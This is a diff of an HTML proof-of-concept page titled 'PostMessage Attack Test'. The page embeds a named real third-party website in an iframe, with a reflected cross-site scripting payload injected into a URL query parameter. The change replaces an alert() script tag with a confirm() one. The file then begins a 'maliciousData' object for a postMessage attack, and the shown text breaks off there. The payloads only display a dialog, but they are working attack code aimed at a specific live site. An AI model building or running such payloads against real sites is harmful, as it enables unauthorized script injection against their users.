@@ -4,7 +4,7 @@
   <title>PostMessage Attack Test</title>
 </head>
 <body>
-  <iframe src="https://www.mindbodyonline.com/business/education?term_vertical=All&term_topics=<script>alert("1")</script>&term_asset_type=534&page=4" width="100%" height="600"></iframe>
+  <iframe src="https://www.mindbodyonline.com/business/education?term_vertical=All&term_topics=<script>confirm(1)</script>&term_asset_type=534&page=4" width="100%" height="600"></iframe>
   <script>
     window.onload = function() {
       let maliciousData = {
